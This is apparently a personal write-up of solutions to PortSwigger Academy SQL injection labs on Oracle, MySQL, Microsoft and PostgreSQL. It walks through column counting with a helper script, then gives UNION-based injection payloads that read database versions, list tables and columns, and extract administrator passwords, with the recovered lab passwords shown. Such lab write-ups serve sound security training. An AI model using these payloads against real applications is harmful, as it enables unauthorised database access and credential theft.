# PortSwigger Academy- SQL Injection

- Author: [Mateusz Głuchowski](https://github.com/hue1337)
- Site: [PortSwigger Academy](https://portswigger.net/)

# Lab: SQL injection attack, querying the database type and version on Oracle



## Steps:
1. Determining amount of columns by using our script `columns_amount.py`.

    ```bash
    python3 columns_amount.py --url https://0aaa00a503c074e683b2504f00b50012.web-security-academy.net/ --param category --amount 6
    ```

2. Looking into Oracle DB documentation to find the way how to determine the version.

    ```sql
    SQL>
    SQL>
    SQL> select banner from v$version;

    BANNER
    ----------------------------------------------------------------
    Oracle Database 10g Express Edition Release 10.2.0.1.0 - Product
    PL/SQL Release 10.2.0.1.0 - Production
    CORE    10.2.0.1.0      Production
    TNS for 32-bit Windows: Version 10.2.0.1.0 - Production
    NLSRTL Version 10.2.0.1.0 - Production

    SQL>

    ```

3. Preparing the payload:

    ```sql
    ' UNION SELECT banner, null FROM v$version -- -
    ```

4. Sending the request and completing the lab.


<div style="page-break-after: always;"></div>

# Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft

## Steps:

1. Using our script (`columns_amount.py`) to determine amount of columns:
    
    ```bash
    python3 columns_amount.py --url https://0a5b005e038c2686836637ae00cd00c9.web-security-academy.net/filter?category=Accessories --param category --amount 5

    ```

2. Checking Microsoft documentation on determing DB version:
    - https://learn.microsoft.com/en-us/troubleshoot/sql/releases/find-my-sql-version

3. Preparing the payload:

    ```sql
    ' UNION SELECT @@version, null-- -
    ```

4. Sending the payload and completing the lab.


# Lab: SQL injection attack, listing the database contents on non-Oracle databases

1. Determining amount of columns and type of DB:

    ``` bash
    ┌──(hue1337㉿kali)-[~/…/GitHub/Portswigger-Academy/SQL_Injection/Scripts]
    └─$ python3 columns_amount.py --url https://0a5e00b003f6855980da8aa50037006c.web-security-academy.net/ --param category --amount 4
    https://0a5e00b003f6855980da8aa50037006c.web-security-academy.net/filter?category=%27%20order%20by%2010--%20-
    [+] Amount of columns: 2 
    [+] Postgre 
                                
    ```

2. From the PostgreSQL Docs we find out how to list the tables:

    ```sql
    select * from information_schema.tables
    ```

3. We can see table `users_xljros`. We gonna extract the password using following payloads:

    ```sql
    ' union select column_name,null from information_schema.columns where table_name='users_xljros'-- -

    ' union select password_wymahi, null from users_xljros where username_nbyctx='administrator'-- -
    ```

4. The password is: `gihs1spbm0jq86ghgc07`

# Lab: SQL injection attack, listing the database contents on Oracle

1. Determining amount of columns:

    ```
    ┌──(hue1337㉿kali)-[~/…/GitHub/Portswigger-Academy/SQL_Injection/Scripts]
    └─$ python3 columns_amount.py --url https://0a6600e9041d095983a6879c00e80017.web-security-academy.net/ --param category --amount 4
    https://0a6600e9041d095983a6879c00e80017.web-security-academy.net/filter?category=%27%20order%20by%2010--%20-
    [+] Amount of columns: 2 
    [+] Oracle DB 
                    
    ```

2. Checking the docs `all_tables`
    ```
    https://docs.oracle.com/en/database/oracle/oracle-database/19/refrn/ALL_TABLES.html#GUID-6823CD28-0681-468E-950B-966C6F71325D
    ```

3. Listing tables names:

    ```sql
    ' union select table_name, null from all_tables-- -
    ```

4. Listing columns names:

    ```SQL
    ' union select column_name, null from all_tab_cols where table_name='USERS_OQAAMW'-- -
    ```

5. Finding the password fot the administrator:
    ```sql
    ' union select PASSWORD_LIEFIK, null from USERS_OQAAMW where USERNAME_DQZARO='administrator'-- -
    ```

6. Logging to administrator acc with the password `o5qpgsrouodfkc3q464b`.


# Lab: SQL injection UNION attack, determining the number of columns returned by the query

1. Determine the amount of columns using `null`s:
    ```sql
    ' union select null, null, null-- -
    ```

2. The lab is solved.

# Lab: SQL injection UNION attack, finding a column containing text

1. Determine the amount of columns:
    ```
    ┌──(hue1337㉿kali)-[~/…/GitHub/Portswigger-Academy/SQL_Injection/Scripts]
    └─$ python3 columns_amount.py --url https://0aaf00c00403110e8571e53d003e00e1.web-security-academy.net/ --param category --amount 4
    [+] Amount of columns: 3 
    ```

2. Identyfing the column which is compatible the string data type:

    ```sql
    ' union select null, 'a', null-- -
    ```

3. Completing the lab:

    ```sql
    ' union select null, '4P3biH', null-- -
    ```

# Lab: SQL injection UNION attack, retrieving data from other tables

1. Determing amount of columns and type of database:

    ```
    ┌──(hue1337㉿kali)-[~/…/GitHub/Portswigger-Academy/SQL_Injection/Scripts]
    └─$ python3 columns_amount.py --url https://0a1900af04ea6e4d814e4f5d00e20028.web-security-academy.net/ --param category --amount 4
    https://0a1900af04ea6e4d814e4f5d00e20028.web-security-academy.net/filter?category=%27%20order%20by%2010--%20-
    [+] Amount of columns: 2
    [+] Postgre 
    ```

2. Displaying tables names:

    ```sql
    ' union select table_name, null from information_schema.tables-- -
    ```

3. Listing all usernames:

    ```sql
    ' union select column_name,null from information_schema.columns where table_name='users'-- -
    ```

    - carlos
    - wiener
    - administrator

4. Getting `adminidstrator`'s password:

    ```sql
    ' union select password, null from users where username='administrator'-- -
    ```

    - 9nvwvn5hbu5llbycp21h


# Lab: SQL injection UNION attack, retrieving multiple values in a single column

1. Determining amount of columns:

    ```
    ┌──(hue1337㉿kali)-[~/…/GitHub/Portswigger-Academy/SQL_Injection/Scripts]
    └─$ python3 columns_amount.py --url https://0aee003b046eaaea838591f1008300b3.web-security-academy.net/ --param category --amount 4
    https://0aee003b046eaaea838591f1008300b3.web-security-academy.net/filter?category=%27%20order%20by%2010--%20-
    [+] Amount of columns: 2 
    ```

2. Listing `usernames`:

    ```sql
    ' union select null, username from users-- -
    ```

3. Retrieving `password` for `administrator`:

    ```sql
    ' union select null, password from users where username='administrator'-- -
    ```

4. Logging in with credentials:
    - administrator
    - iyss16ett8k3ts7ugtut

